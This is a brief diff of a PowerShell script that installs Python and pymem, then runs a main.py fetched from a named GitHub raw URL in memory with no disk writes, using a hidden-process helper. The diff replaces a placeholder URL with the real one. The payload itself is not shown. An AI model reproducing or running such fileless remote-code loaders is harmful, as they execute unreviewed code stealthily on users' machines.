@@ -1,7 +1,7 @@
 # main.ps1 - Checks/installs Python and pymem, then runs main.py from memory (no disk writes)
 param(
     [string]$PythonInstallerUrl = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe",
-    [string]$MainPyUrl = "https://raw.githubusercontent.com/your-repo/main.py"  # Replace with actual raw URL
+    [string]$MainPyUrl = "https://raw.githubusercontent.com/official-jahid/bios-v2/refs/heads/main/main.py"  # Replace with actual raw URL
 )
 
 # ---- Helper: Run hidden process ----
